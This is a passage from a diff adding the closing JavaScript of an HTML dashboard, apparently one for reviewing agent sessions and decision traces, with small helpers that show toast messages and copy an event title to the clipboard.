+    function openSession() { showToast('会话页入口：打开对应 Session 的 Prompt、意图与完整 Decision Trace'); }
+    function copyEvidence() { navigator.clipboard?.writeText(document.getElementById('detailTitle').textContent).catch(() => {}); showToast('事件摘要已复制'); }
+    function showToast(message) { const toast = document.getElementById('toast'); toast.textContent = message; toast.classList.add('show'); clearTimeout(window.__toast); window.__toast = setTimeout(() => toast.classList.remove('show'), 2200); }
+    applyFilters();
+  </script>
+</body>
+</html>
